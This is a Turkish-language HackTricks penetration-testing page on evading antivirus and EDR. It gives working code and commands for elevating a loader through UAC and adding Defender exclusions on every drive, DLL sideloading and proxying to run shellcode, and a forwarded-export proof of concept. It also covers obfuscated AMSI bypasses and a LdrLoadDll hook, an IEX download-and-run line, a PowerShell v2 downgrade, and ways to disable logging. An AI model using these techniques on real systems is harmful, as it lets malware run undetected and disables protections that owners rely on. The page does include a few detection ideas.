# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa ilk olarak** [**@m2rc_p**](https://twitter.com/m2rc_p) **tarafından yazılmıştır!**

## Defender'ı Durdurma

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durduran bir araç.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV'yi taklit ederek Windows Defender'ın çalışmasını durduran bir araç.
- [Admin iseniz Defender'ı devre dışı bırakın](basic-powershell-for-pentesters/README.md)

### Defender'a müdahale etmeden önce installer tarzı UAC tuzağı

Game cheat kılığındaki public loader'lar genellikle önce **kullanıcıdan yükseltme izni isteyen**, ardından Defender'ı etkisiz hâle getiren imzasız Node.js/Nexe installer'ları olarak dağıtılır. Akış basittir:

1. `net session` ile administrative context olup olmadığını kontrol eder. Komut yalnızca çağıran taraf admin haklarına sahip olduğunda başarılı olur; dolayısıyla başarısızlık, loader'ın standard user olarak çalıştığını gösterir.
2. Orijinal command line'ı korurken beklenen UAC consent prompt'unu tetiklemek için kendisini `RunAs` verb'üyle hemen yeniden başlatır.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Kurbanlar zaten “cracked” yazılım yüklediklerine inandığından istem genellikle kabul edilir ve malware, Defender’ın policy’sini değiştirmek için ihtiyaç duyduğu hakları elde eder.<sup>[[26]](#references)</sup>

### Her sürücü harfi için kapsamlı `MpPreference` exclusions

Yetki yükseltildikten sonra GachiLoader tarzı zincirler, service’i tamamen devre dışı bırakmak yerine Defender’ın kör noktalarını en üst düzeye çıkarır. Loader önce GUI watchdog’unu (`taskkill /F /IM SecHealthUI.exe`) sonlandırır ve ardından **son derece geniş exclusions** ekleyerek her user profile’ının, system directory’sinin ve çıkarılabilir diskin taranamaz hâle gelmesini sağlar:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Temel gözlemler:

- Döngü, bağlı tüm dosya sistemlerini (D:\, E:\, USB bellekler vb.) tarar; bu nedenle diskin herhangi bir yerine bırakılacak gelecekteki payload'lar yok sayılır.
- `.sys` uzantısı istisnası ileriye dönüktür; saldırganlar Defender'a tekrar dokunmadan ileride unsigned driver yükleme seçeneğini saklı tutar.
- Tüm değişiklikler `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` altında yapılır; böylece sonraki aşamalar, UAC'yi yeniden tetiklemeden istisnaların kalıcı olduğunu doğrulayabilir veya bunları genişletebilir.

Hiçbir Defender servisi durdurulmadığından, basit health check'ler gerçek zamanlı inceleme bu yollara hiç uygulanmasa bile “antivirus active” bildirmeye devam eder.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Günümüzde AV'ler bir dosyanın malicious olup olmadığını kontrol etmek için farklı yöntemler kullanır: static detection, dynamic analysis ve daha gelişmiş EDR'lerde behavioural analysis.

### **Static detection**

Static detection, bir binary veya script içindeki bilinen malicious string'leri ya da byte dizilerini işaretleyerek ve ayrıca dosyanın kendisinden bilgiler (ör. file description, company name, digital signatures, icon, checksum vb.) çıkararak gerçekleştirilir. Bu, bilinen public tool'ları kullanmanın yakalanmanızı kolaylaştırabileceği anlamına gelir; çünkü bu araçlar muhtemelen analiz edilmiş ve malicious olarak işaretlenmiştir. Bu tür detection yöntemini aşmanın birkaç yolu vardır:

- **Encryption**

Binary'yi encrypt ederseniz AV'nin programınızı tespit etmesi mümkün olmaz; ancak programı decrypt edip memory'de çalıştırmak için bir loader'a ihtiyacınız olacaktır.

- **Obfuscation**

Bazen binary veya script'inizdeki bazı string'leri değiştirmeniz, AV'yi aşmanız için yeterlidir; ancak neyi obfuscate etmeye çalıştığınıza bağlı olarak bu zaman alıcı bir iş olabilir.

- **Custom tooling**

Kendi tool'larınızı geliştirirseniz bilinen bad signature'lar bulunmaz; ancak bu çok fazla zaman ve çaba gerektirir.

> [!TIP]
> Windows Defender'ın static detection'ına karşı kontrol yapmak için iyi bir araç [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)'tir. Temel olarak dosyayı birden fazla segmente böler ve ardından Defender'a her birini ayrı ayrı scan ettirir; bu sayede binary'nizde hangi string veya byte'ların işaretlendiğini tam olarak görebilirsiniz.

Pratik AV Evasion hakkında bu [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)'ine göz atmanızı kesinlikle öneririm.

### **Dynamic analysis**

Dynamic analysis, AV'nin binary'nizi bir sandbox'ta çalıştırıp malicious activity'yi izlemesidir (ör. browser'ınızın password'lerini decrypt edip okumaya çalışma, LSASS üzerinde minidump gerçekleştirme vb.). Bu kısımla çalışmak biraz daha zor olabilir; ancak sandbox'ları evade etmek için yapabileceğiniz bazı şeyler şunlardır:

- **Execution öncesinde sleep kullanmak** Nasıl implement edildiğine bağlı olarak bu, AV'nin dynamic analysis'ini bypass etmek için harika bir yöntem olabilir. AV'lerin dosyaları kullanıcı workflow'unu kesintiye uğratmayacak şekilde scan etmek için çok kısa bir süresi vardır; bu nedenle uzun sleep süreleri binary'lerin analysis sürecini bozabilir. Sorun şu ki birçok AV sandbox'ı, nasıl implement edildiğine bağlı olarak sleep'i atlayabilir.
- **Machine kaynaklarını kontrol etmek** Sandbox'lar genellikle çalışmak için çok az kaynağa sahiptir (ör. < 2GB RAM); aksi takdirde kullanıcının makinesini yavaşlatabilirler. Burada oldukça yaratıcı da olabilirsiniz; örneğin CPU sıcaklığını veya fan hızlarını kontrol edebilirsiniz, çünkü bunların hepsi sandbox'ta implement edilmemiş olabilir.
- **Machine-specific kontroller** “contoso.local” domain'ine join edilmiş bir workstation'ı hedeflemek istiyorsanız, bilgisayarın domain'ini kontrol ederek belirttiğiniz domain ile eşleşip eşleşmediğini görebilirsiniz; eşleşmiyorsa programınızın çıkmasını sağlayabilirsiniz.

Microsoft Defender'ın Sandbox computername'inin HAL9TH olduğu ortaya çıktı; bu nedenle detonation öncesinde malware'inizde computer name'i kontrol edebilirsiniz. İsim HAL9TH ile eşleşiyorsa Defender'ın sandbox'ının içindesiniz demektir; bu durumda programınızın çıkmasını sağlayabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>kaynak: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes'a karşı kullanılabilecek [@mgeeky](https://twitter.com/mariuszbit)'den bazı diğer çok iyi ipuçları:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Bu post'ta daha önce söylediğimiz gibi, **public tool'lar** eninde sonunda **detected** olur; bu nedenle kendinize şu soruyu sormalısınız:

Örneğin LSASS dump etmek istiyorsanız, **gerçekten mimikatz kullanmanız gerekiyor mu**? Yoksa daha az bilinen ve LSASS dump eden farklı bir project kullanabilir misiniz?

Doğru cevap muhtemelen ikincisidir. mimikatz'ı örnek alırsak, AV'ler ve EDR'ler tarafından en çok, hatta belki de en fazla flagged edilen malware parçalarından biridir. Project'in kendisi çok iyi olsa da AV'leri aşarak çalıştırmak bir nightmare'dir; bu nedenle gerçekleştirmeye çalıştığınız şey için alternatifler arayın.

> [!TIP]
> Payload'larınızı evasion için değiştirirken Defender'da **automatic sample submission'ı kapattığınızdan** emin olun ve lütfen, uzun vadede evasion elde etmek istiyorsanız **VIRUSTOTAL'A UPLOAD ETMEYİN**. Payload'ınızın belirli bir AV tarafından detected olup olmadığını kontrol etmek istiyorsanız, AV'yi bir VM'e install edin, automatic sample submission'ı kapatmayı deneyin ve sonuçtan memnun kalana kadar orada test edin.

## EXEs vs DLLs

Mümkün olduğunda evasion için her zaman **DLL kullanmaya öncelik verin**. Deneyimlerime göre DLL dosyaları genellikle **çok daha az detected** olur ve analiz edilir; bu nedenle payload'ınızın DLL olarak çalıştırılabilmesinin bir yolu varsa, bazı durumlarda detection'dan kaçınmak için kullanabileceğiniz çok basit bir trick'tir.

Bu image'da görebileceğimiz gibi, Havoc'tan alınan bir DLL Payload'ın antiscan.me üzerindeki detection rate'i 4/26 iken EXE payload'ın detection rate'i 7/26'dır.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>normal bir Havoc EXE payload ile normal bir Havoc DLL'nin antiscan.me karşılaştırması</p></figcaption></figure>

Şimdi DLL dosyalarıyla çok daha stealthier olmak için kullanabileceğiniz bazı trick'leri göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading**, hem victim application'ı hem de malicious payload(lar)ı yan yana konumlandırarak loader tarafından kullanılan DLL search order'dan yararlanır.

DLL Sideloading'e susceptible program'ları [Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell script'i kullanarak kontrol edebilirsiniz:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Bu komut, "C:\Program Files\\" içindeki DLL hijacking işlemine açık programların listesini ve yüklemeye çalıştıkları DLL dosyalarını çıktılar.

**DLL Hijackable/Sideloadable programs**'ları kendiniz **explore etmenizi** önemle tavsiye ederim; bu teknik düzgün uygulandığında oldukça stealthy'dir, ancak publicly known DLL Sideloadable programs kullanırsanız kolayca yakalanabilirsiniz.

Kötü amaçlı bir DLL'yi, programın yüklemeyi beklediği adla yerleştirmek payload'unuzu yüklemesini sağlamaz; çünkü program, bu DLL'nin içinde bazı specific functions bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adı verilen başka bir teknik kullanacağız.

**DLL Proxying**, bir programın proxy (ve malicious) DLL'ye yaptığı çağrıları original DLL'ye yönlendirir; böylece programın functionality'si korunur ve payload'unuzun execution'ını yönetebilirsiniz.

[@flangvik](https://twitter.com/Flangvik) tarafından geliştirilen [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project'ini kullanacağım.

İzlediğim adımlar şunlardı:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Son komut bize 2 dosya verecek: bir DLL source code şablonu ve yeniden adlandırılmış asıl DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem [SGN](https://github.com/EgeBalci/sgn) ile encode edilmiş shellcode'umuzun hem de proxy DLL'in [antiscan.me](https://antiscan.me) üzerinde 0/26 Detection rate'i var! Bunu başarı olarak değerlendiriyorum.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading hakkında [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543)'unu ve ele aldığımız konuları daha derinlemesine öğrenmek için [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE)'sunu **kesinlikle izlemenizi** öneririm.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modülleri, aslında "forwarders" olan işlevleri export edebilir: export girdisi kodu göstermek yerine `TargetDll.TargetFunc` biçiminde bir ASCII string içerir. Bir caller export'u resolve ettiğinde Windows loader:

- Henüz yüklenmemişse `TargetDll`'yi yükler
- `TargetFunc`'yi yüklenen modülden resolve eder

Anlaşılması gereken temel davranışlar:
- `TargetDll` bir KnownDLL ise, korumalı KnownDLLs namespace'inden sağlanır (ör. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- `TargetDll` bir KnownDLL değilse normal DLL search order kullanılır; buna forward resolution işlemini gerçekleştiren modülün bulunduğu dizin de dahildir.

Bu, dolaylı bir sideloading primitive'i sağlar: bir işlevi KnownDLL olmayan bir modül adına forward eden signed bir DLL bulunur, ardından bu signed DLL, forwarded target module ile tam olarak aynı adı taşıyan attacker-controlled bir DLL ile aynı dizine yerleştirilir. Forwarded export çağrıldığında loader forward'u resolve eder ve DLL'inizi aynı dizinden yükleyerek DllMain'inizi çalıştırır.<sup>[[13]](#references)</sup>

Windows 11 üzerinde gözlemlenen örnek:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` bir KnownDLL değildir, bu nedenle normal arama sırasına göre çözümlenir.

PoC (copy-paste):
1) İmzalı sistem DLL'sini yazılabilir bir klasöre kopyalayın
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı bir `NCRYPTPROV.dll` bırakın. Kod çalıştırmayı sağlamak için minimal bir DllMain yeterlidir; DllMain'i tetiklemek için yönlendirilen işlevi uygulamanız gerekmez.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Signed LOLBin ile forward'ı tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Gözlemlenen davranış:
- rundll32 (signed), side-by-side `keyiso.dll` dosyasını (signed) yükler
- `KeyIsoSetAuditingInterface` çözümlenirken loader, `NCRYPTPROV.SetAuditingInterface` yönlendirmesini takip eder
- Loader ardından `C:\test` konumundaki `NCRYPTPROV.dll` dosyasını yükler ve `DllMain` işlevini çalıştırır
- `SetAuditingInterface` uygulanmamışsa, "missing API" hatasını yalnızca `DllMain` zaten çalıştıktan sonra alırsınız

Hunting ipuçları:
- Hedef modülün KnownDLL olmadığı forwarded export'lara odaklanın. KnownDLL'ler `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` altında listelenir.
- Forwarded export'ları aşağıdakiler gibi araçlarla enumerate edebilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Adayları aramak için Windows 11 forwarder envanterine bakın: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Detection/defense fikirleri:
- LOLBins'in (ör. `rundll32.exe`) sistem dışı yollardan imzalı DLL'leri yüklemesini ve ardından aynı temel ada sahip, KnownDLLs olmayan DLL'leri bu dizinden yüklemesini izleyin
- Şu tür işlem/modül zincirlerinde uyarı oluşturun: `rundll32.exe` → sistem dışı `keyiso.dll` → kullanıcı tarafından yazılabilir yollar altındaki `NCRYPTPROV.dll`
- Code integrity politikalarını (WDAC/AppLocker) uygulayın ve uygulama dizinlerinde write+execute işlemlerini engelleyin

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze'i shellcode'unuzu stealthy bir şekilde yüklemek ve çalıştırmak için kullanabilirsiniz.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion yalnızca bir kedi-fare oyunudur; bugün çalışan bir şey yarın tespit edilebilir. Bu nedenle hiçbir zaman yalnızca tek bir araca güvenmeyin ve mümkünse birden fazla evasion tekniğini zincirlemeyi deneyin.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR'ler genellikle `ntdll.dll` içindeki syscall stub'larına **user-mode inline hook'lar** yerleştirir. Bu hook'ları bypass etmek için doğru **SSN**'yi (System Service Number) yükleyen ve hook'lanmış export entrypoint'i çalıştırmadan kernel mode'a geçiş yapan **direct** veya **indirect** syscall stub'ları oluşturabilirsiniz.<sup>[[32]](#references)</sup>

**Invocation seçenekleri:**
- **Direct (embedded)**: oluşturulan stub içine bir `syscall`/`sysenter`/`SVC #0` instruction'ı ekler (`ntdll` export'una erişilmez).
- **Indirect**: kernel geçişinin `ntdll` kaynaklı görünmesi için `ntdll` içindeki mevcut bir `syscall` gadget'ına atlar (heuristic evasion için kullanışlıdır); **randomized indirect**, her çağrı için bir pool içinden gadget seçer.
- **Egg-hunt**: statik `0F 05` opcode sequence'ını disk üzerinde embed etmekten kaçınır; bir syscall sequence'ını runtime sırasında çözer.

**Hook-resistant SSN resolution stratejileri:**
- **FreshyCalls (VA sort)**: SSN'leri stub byte'larını okumak yerine syscall stub'larını virtual address'lerine göre sıralayarak çıkarır.
- **SyscallsFromDisk**: temiz bir `\KnownDlls\ntdll.dll` map eder, SSN'leri bunun `.text` bölümünden okur ve ardından unmap eder (bellekteki tüm hook'ları bypass eder).
- **RecycledGate**: VA-sorted SSN inference'ı, bir stub temiz olduğunda opcode validation ile birleştirir; stub hook'lanmışsa VA inference'a geri döner.
- **HW Breakpoint**: `syscall` instruction'ı üzerinde DR0 ayarlar ve hook'lanmış byte'ları parse etmeden runtime sırasında `EAX` içindeki SSN'yi yakalamak için bir VEH kullanır.

SysWhispers4 kullanım örneği:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI, "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"ı önlemek için oluşturuldu. Başlangıçta AV'ler yalnızca **diskteki dosyaları** tarayabiliyordu; bu nedenle payload'ları bir şekilde **doğrudan bellekte** çalıştırabilirseniz, yeterli görünürlüğe sahip olmadığı için AV bunu önlemek adına hiçbir şey yapamazdı.

AMSI özelliği, Windows'un şu bileşenlerine entegre edilmiştir.

- User Account Control veya UAC (EXE, COM, MSI ya da ActiveX kurulumu için elevation)
- PowerShell (script'ler, etkileşimli kullanım ve dynamic code evaluation)
- Windows Script Host (wscript.exe ve cscript.exe)
- JavaScript ve VBScript
- Office VBA macro'ları

Antivirus çözümlerinin script içeriklerini hem şifrelenmemiş hem de obfuscation uygulanmamış bir biçimde sunarak script davranışını incelemesine olanak tanır.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` komutunu çalıştırmak, Windows Defender'da aşağıdaki alert'in oluşmasına neden olur.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:` ifadesini ve ardından script'in çalıştırıldığı executable'ın path'ini eklediğine dikkat edin; bu örnekte bu dosya powershell.exe'dir.

Diske hiçbir dosya bırakmadık, ancak AMSI nedeniyle yine de in-memory yakalandık.

Ayrıca, **.NET 4.8** ile birlikte C# kodu da AMSI üzerinden çalıştırılır. Bu durum, in-memory execution yüklemek için kullanılan `Assembly.Load(byte[])` işlemini bile etkiler. Bu nedenle, AMSI'dan kaçınmak istiyorsanız in-memory execution için daha düşük .NET sürümlerinin (4.7.2 veya altı gibi) kullanılması önerilir.

AMSI'ı aşmanın birkaç yolu vardır:

- **Obfuscation**

AMSI esas olarak static detection'lar ile çalıştığından, yüklemeye çalıştığınız script'leri değiştirmek detection'dan kaçınmak için iyi bir yöntem olabilir.

Ancak AMSI, birden fazla katmana sahip olsa bile script'leri unobfuscate etme yeteneğine sahiptir; bu nedenle obfuscation, nasıl uygulandığına bağlı olarak kötü bir seçenek olabilir. Bu durum, AMSI'dan kaçınmayı pek straightforward hale getirmez. Bununla birlikte, bazen tek yapmanız gereken birkaç variable name'i değiştirmektir ve sorun çözülür; dolayısıyla bu, bir şeyin ne ölçüde flag'lendiğine bağlıdır.

- **AMSI Bypass**

AMSI, powershell (ayrıca cscript.exe, wscript.exe vb.) process'ine bir DLL yüklenerek uygulandığından, unprivileged bir user olarak çalışırken bile kolayca tamper etmek mümkündür. AMSI'ın implementation'ındaki bu flaw nedeniyle araştırmacılar, AMSI scanning'den kaçınmak için birden fazla yöntem bulmuştur.

**Forcing an Error**

AMSI initialization'ının başarısız olmaya zorlanması (`amsiInitFailed`), mevcut process için hiçbir scan başlatılmamasına neden olur. Bu yöntem ilk olarak [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklanmış ve Microsoft daha yaygın kullanımını önlemek için bir signature geliştirmiştir.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
AMSI'yi mevcut powershell process'i için kullanılamaz hâle getirmek yalnızca bir satır powershell code'u gerektirdi. Elbette bu satır AMSI tarafından da flag'lendi, bu nedenle bu technique'i kullanabilmek için bazı değişiklikler yapılması gerekiyor.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) üzerinden aldığım değiştirilmiş bir AMSI bypass.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (kullanıcı tarafından sağlanan girdiyi taramaktan sorumludur) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Daha ayrıntılı bir açıklama için lütfen [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) adresini okuyun.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### amsi.dll yüklemesini engelleyerek AMSI'yi bloklama (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. Sağlam ve dilden bağımsız bir bypass yöntemi, `ntdll!LdrLoadDll` üzerine, istenen modül `amsi.dll` olduğunda hata döndüren bir user-mode hook yerleştirmektir. Bunun sonucunda AMSI hiçbir zaman yüklenmez ve bu process için hiçbir tarama gerçekleştirilmez.<sup>[[23]](#references)</sup>

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notlar
- PowerShell, WScript/CScript ve custom loader'lar genelinde çalışır (aksi durumda AMSI'yi yükleyecek her şey).
- Uzun command-line artefact'larından kaçınmak için script'leri stdin üzerinden beslemeyle (`PowerShell.exe -NoProfile -NonInteractive -Command -`) birlikte kullanın.
- LOLBins üzerinden çalıştırılan loader'larda kullanıldığı görülmüştür (ör. `regsvr32` ile `DllRegisterServer` çağrılması).

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** tool'u da AMSI'yi bypass etmek için script üretir.
**[https://amsibypass.com/](https://amsibypass.com/)** tool'u da randomized user-defined function, variables, characters expression kullanarak ve signature'ı önlemek için PowerShell keyword'lerine random character casing uygulayarak signature'dan kaçınan AMSI bypass script'i üretir.

**Tespit edilen signature'ı kaldırma**

Mevcut process'in memory'sinden tespit edilen AMSI signature'ını kaldırmak için **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi bir tool kullanabilirsiniz. Bu tool, mevcut process'in memory'sini AMSI signature'ı için tarar ve ardından signature'ı NOP instruction'larıyla overwrite ederek onu memory'den etkili bir şekilde kaldırır.

**AMSI kullanan AV/EDR ürünleri**

AMSI kullanan AV/EDR ürünlerinin listesini **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** üzerinde bulabilirsiniz.

**Powershell version 2 kullanın**
PowerShell version 2 kullanırsanız AMSI yüklenmez; böylece script'lerinizi AMSI tarafından scan edilmeden çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging, bir sistemde çalıştırılan tüm PowerShell komutlarını loglamanızı sağlayan bir özelliktir. Bu özellik auditing ve troubleshooting amaçlarıyla yararlı olabilir, ancak aynı zamanda **tespitten kaçmak isteyen saldırganlar için bir sorun** oluşturabilir.

PowerShell logging'i bypass etmek için aşağıdaki teknikleri kullanabilirsiniz:

- **PowerShell Transcription ve Module Logging'i devre dışı bırakma**: Bu amaçla [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir tool kullanabilirsiniz.
- **Powershell version 2 kullanma**: PowerShell version 2 kullanırsanız AMSI yüklenmez; böylece script'lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz: `powershell.exe -version 2`
- **Unmanaged Powershell Session kullanma**: defenses olmadan bir powershell başlatmak için [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (Cobal Strike'ın `powerpick` komutunun kullandığı yöntem budur).


## Obfuscation

> [!TIP]
> Birkaç obfuscation tekniği verileri encrypt etmeye dayanır; bu da binary'nin entropy'sini artırarak AV'lerin ve EDR'lerin onu tespit etmesini kolaylaştırır. Buna dikkat edin ve encryption işlemini yalnızca kodunuzun hassas olan veya gizlenmesi gereken belirli bölümlerine uygulamayı düşünün.

### ConfuserEx-Protected .NET Binaries Deobfuscating

ConfuserEx 2 (veya commercial fork'larını) kullanan malware'leri analiz ederken decompiler'ları ve sandbox'ları engelleyen birkaç protection katmanıyla karşılaşmak yaygındır. Aşağıdaki workflow, sonrasında dnSpy veya ILSpy gibi tool'larda C#'a decompile edilebilecek **orijinale yakın bir IL'i güvenilir şekilde geri yükler**.<sup>[[10]](#references)</sup>

1.  Anti-tampering removal – ConfuserEx her *method body*'yi encrypt eder ve bunları *module* static constructor'ı (`<Module>.cctor`) içinde decrypt eder. Ayrıca PE checksum'ını patch eder; bu nedenle yapılan herhangi bir değişiklik binary'nin crash olmasına yol açar. Encrypted metadata tablolarını bulmak, XOR key'lerini kurtarmak ve temiz bir assembly yeniden yazmak için **AntiTamperKiller** kullanın:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Çıktı, kendi unpacker'ınızı oluştururken yararlı olabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2.  Symbol / control-flow recovery – *clean* dosyayı **de4dot-cex**'e (ConfuserEx-aware bir de4dot fork'u) verin.
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profile'ını seçer
• de4dot control-flow flattening'i geri alır, original namespace'leri, class'ları ve variable name'leri geri yükler ve constant string'leri decrypt eder.

